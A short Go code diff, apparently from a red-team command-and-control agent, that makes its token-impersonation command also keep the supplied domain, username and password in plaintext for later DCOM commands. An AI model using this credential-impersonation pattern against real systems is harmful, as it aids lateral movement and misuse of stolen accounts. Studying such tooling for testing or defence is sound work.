@@ -135,6 +135,9 @@ func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
+	// Store plaintext credentials for commands needing explicit auth (DCOM)
+	SetIdentityCredentials(params.Domain, params.Username, params.Password)
+
 	// Get new identity to confirm impersonation
 	newIdentity, err := GetCurrentIdentity()
 	if err != nil {
